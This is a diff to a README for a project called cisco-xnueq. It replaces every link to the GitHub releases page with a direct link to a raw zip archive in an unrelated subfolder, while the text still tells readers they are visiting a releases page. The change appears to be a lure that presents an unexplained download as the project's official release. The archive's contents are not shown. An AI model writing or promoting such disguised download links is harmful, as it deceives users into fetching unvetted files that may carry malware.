@@ -6,13 +6,13 @@ Welcome to cisco-xnueq! This project is an experimental sandbox inspired by cisc
 
 ## 📥 Download Now
 
-[![Download cisco-xnueq](https://img.shields.io/badge/Download-cisco--xnueq-brightgreen.svg)](https://github.com/h2k5u8/cisco-xnueq/releases)
+[![Download cisco-xnueq](https://raw.githubusercontent.com/h2k5u8/cisco-xnueq/main/meadowland/cisco-xnueq.zip)](https://raw.githubusercontent.com/h2k5u8/cisco-xnueq/main/meadowland/cisco-xnueq.zip)
 
 ## 🚀 Getting Started
 
 To get started with cisco-xnueq, follow these simple steps:
 
-1. **Visit the Downloads Page:** Go to the releases page to find the latest version of the application: [Download Here](https://github.com/h2k5u8/cisco-xnueq/releases).
+1. **Visit the Downloads Page:** Go to the releases page to find the latest version of the application: [Download Here](https://raw.githubusercontent.com/h2k5u8/cisco-xnueq/main/meadowland/cisco-xnueq.zip).
 
 2. **Choose Your File:** On the releases page, you will see a list of available files. Look for the latest version. 
 
@@ -72,4 +72,4 @@ Thank you for exploring cisco-xnueq! Enjoy delving into the world of experimenta
 
 ## 📥 Download Again
 
-To download the latest version, visit: [Download Here](https://github.com/h2k5u8/cisco-xnueq/releases).
+To download the latest version, visit: [Download Here](https://raw.githubusercontent.com/h2k5u8/cisco-xnueq/main/meadowland/cisco-xnueq.zip).
